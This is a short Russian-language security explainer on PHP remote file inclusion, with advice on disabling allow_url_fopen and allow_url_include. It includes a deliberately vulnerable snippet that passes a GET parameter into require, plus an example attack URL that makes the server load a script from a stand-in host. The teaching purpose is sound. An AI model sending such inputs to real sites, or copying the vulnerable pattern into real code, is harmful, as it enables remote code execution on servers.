# Remote file inclusion

Remote file inclusion (RFI) - уязвимость, при которой злоумышленник может подключить удаленный скрипт.


### Пример

```php
$page = $_GET['page'] ?? 'home'

require $page . '.php';
```
В приведенном примере параметр `page` может указывать на внешний скрипт, например,
`http://yourdomain.tld/index.php?page=http://example.com/evilscript`

### Защита

Отключите следующие директивы в php.ini:

```ini
; Disable including remote files
allow_url_fopen = off
; Disable opening remote files for include(), require(), include_once() and require_once() functions.
; If above allow_url_fopen is disabled, allow_url_include is also disabled.
allow_url_include = off
```


